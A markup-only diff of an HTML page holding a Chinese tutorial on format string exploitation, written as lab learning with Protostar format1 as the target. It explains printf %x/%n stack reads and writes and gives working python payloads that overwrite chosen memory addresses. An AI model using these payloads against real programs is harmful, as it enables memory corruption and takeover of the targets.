@@ -117,35 +117,40 @@
 
 <p>1&gt;printf(“%x”)</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("%x"):未进入printf函数前,第一个栈里的值
-</code></pre></div></div>
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("%x"):未进入printf函数前,第一个栈里的值
+</code></pre>
+</div>
 
 <p>2&gt;printf(“%8x”)</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("%8x"):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
-</code></pre></div></div>
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("%8x"):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
+</code></pre>
+</div>
 
 <p>3&gt;<code class="highlighter-rouge">printf("%3\$x")</code></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("%3\$x"):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")来达到同样的目的)
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("%3\$x"):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")来达到同样的目的)
 宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <p>4&gt;<code class="highlighter-rouge">printf("%3\$n")</code></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("AAAA%3\$n"):将4(4个A)写入第三个栈里的值指向的内存空间(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")),也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
-</code></pre></div></div>
+<div class="highlighter-rouge"><pre class="highlight"><code>printf("AAAA%3\$n"):将4(4个A)写入第三个栈里的值指向的内存空间(这一条适用于绝大多数的*nix的系统,win下不支持则用printf("%x,%x,%x")),也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
+</code></pre>
+</div>
 
 <h3 id="0x02-原理理解">0x02 原理理解</h3>
 
 <h4 id="1refer">1&gt;refer</h4>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://drops.wooyun.org/binary/7714
+<div class="highlighter-rouge"><pre class="highlight"><code>https://drops.wooyun.org/binary/7714
 https://drops.wooyun.org/papers/9426
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="2c代码">2&gt;c代码</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>假设文件名为md.c
+<div class="highlighter-rouge"><pre class="highlight"><code>假设文件名为md.c
 ------------md.c----------------
 #include &lt;stdio.h&gt;
 int main(void)
@@ -164,14 +169,15 @@ int main(void)
     return 0;
 }
 -------------end----------------
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="3栈空间">3&gt;栈空间</h4>
 
 <p><a href="https://www.cplusplus.com/reference/cstdio/printf/">printf函数</a><br />
 int printf ( const char * format, …  )</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨
+<div class="highlighter-rouge"><pre class="highlight"><code>第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨
 
 一般在栈空间里,形如"%8xaaa%8d%n"的字符串参数会存放在某个地方,而在栈中printf的第一个参数char *format一般是这个字符串("%8xaaa%8d%n")的地址,这个栈单元下面(高地址)的栈单元中存放的值是被cpu当作的后续参数,eg:
 
@@ -192,11 +198,12 @@ printf("%8xaaa%8d%n")在栈中的数据如下:
 后来发现这是windows中的情况,kalix64中栈中第一个参数的位置存放的不再是字符串"%8xaaa%8d%n"地址,而是字符串本身
 
 上面的2中的c代码对应的栈中分配的情况如下图format所示:
-</code></pre></div></div>
+</code></pre>
+</div>
 <p>图format
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/format.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现"写"
+<div class="highlighter-rouge"><pre class="highlight"><code>后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现"写"
 
 因此,这个实验更适合在linux下进行,且kalix64中的情况与https://drops.wooyun.org/papers/9426中的情况不一样,将md.c复制到protostar(32位)系统中进行实验
 
@@ -348,18 +355,20 @@ python -c "print '\x88\xf7\xff\xbf'+'%8x%8x%8x%1972x%n'" | ./md
 python -c "print '\x88\xf7\xff\xbf'+'%1996x%5\$n'" | ./md
 成功修改了flag的值为2000,打印出了good!
 
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x03-提炼方法">0x03 提炼方法</h3>
 
 <p>环境:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x32系统下,在call printf这一句汇编语句执行前
-</code></pre></div></div>
+<div class="highlighter-rouge"><pre class="highlight"><code>x32系统下,在call printf这一句汇编语句执行前
+</code></pre>
+</div>
 
 <h4 id="方法1精确打击在0x12345678地址中写入0x40404040">方法1&gt;精确打击:在0x12345678地址中写入0x40404040</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(适用aslr关闭)
+<div class="highlighter-rouge"><pre class="highlight"><code>(适用aslr关闭)
 1&gt;输入python -c "print 'AAAABBBB'+'%8x'*20"
 
     0.输入python -c "print '%3\$x'"查看是否支持\$
@@ -386,11 +395,12 @@ python -c "print '\x88\xf7\xff\xbf'+'%1996x%5\$n'" | ./md
     如果不支持\$则用:
     python -c "print 'AA\x78\x56\x34\x12BB'+'%1077952565x'+'%1x'*3+'%n'"
 
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h4 id="方法2动态打击在0x1234568中写入0x40404040">方法2&gt;动态打击:在0x1234568中写入0x40404040</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(适用于可找到某一栈单元内容为0x12345678的情况,找不到的情况用方法1,该方法可用于aslr开启下)
+<div class="highlighter-rouge"><pre class="highlight"><code>(适用于可找到某一栈单元内容为0x12345678的情况,找不到的情况用方法1,该方法可用于aslr开启下)
 
 0&gt;输入python -c "print '%3\$x'"查看是否支持\$
 
@@ -416,11 +426,12 @@ python -c "print '\x88\xf7\xff\xbf'+'%1996x%5\$n'" | ./md
   这样可以尝试更改输入使0x12345678刚好出现在一个栈中,eg.输入:
   python -c "print 'B%(value1)x'+'%8x'*29+'%n'"
   但这不一定有效
-</code></pre></div></div>
+</code></pre>
+</div>
 
 <h3 id="0x04-小试牛刀">0x04 小试牛刀</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>target:
+<div class="highlighter-rouge"><pre class="highlight"><code>target:
 https://exploit-exercises.com/protostar/format1/
 
 source:
@@ -473,7 +484,8 @@ mykey:
         ./format1 `python -c "print 'AA\x38\x96\x04\x08BB'+'%x.'*131+'%n.'+'%x.'*8"`
         output:
         .....you have modified the target :)
-</code></pre></div></div>
+</code></pre>
+</div>
 
 </span>
 
